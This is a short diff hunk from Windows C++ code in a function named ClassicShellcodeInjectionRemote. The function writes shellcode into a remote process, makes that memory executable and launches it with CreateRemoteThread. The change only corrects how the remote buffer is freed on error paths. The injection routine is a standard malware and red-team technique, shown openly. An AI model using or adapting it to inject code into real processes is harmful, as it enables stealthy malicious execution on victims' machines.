@@ -41,22 +41,22 @@ BOOL ClassicShellcodeInjectionRemote() {
 	}
 
 	if (!WriteProcessMemory(hProcess, lpRemoteBuffer, (LPCVOID)shellcode, sizeof(shellcode), nullptr)) {
+		VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
-		VirtualFree(lpRemoteBuffer, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
 	DWORD dwOldProtect = 0;
 	if (!VirtualProtectEx(hProcess, lpRemoteBuffer, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
+		VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
-		VirtualFree(lpRemoteBuffer, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
 	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpRemoteBuffer, nullptr, 0, nullptr);
 	if (!hThread) {
+		VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
-		VirtualFree(lpRemoteBuffer, 0, MEM_RELEASE);
 	}
 
 	CloseHandle(hProcess);
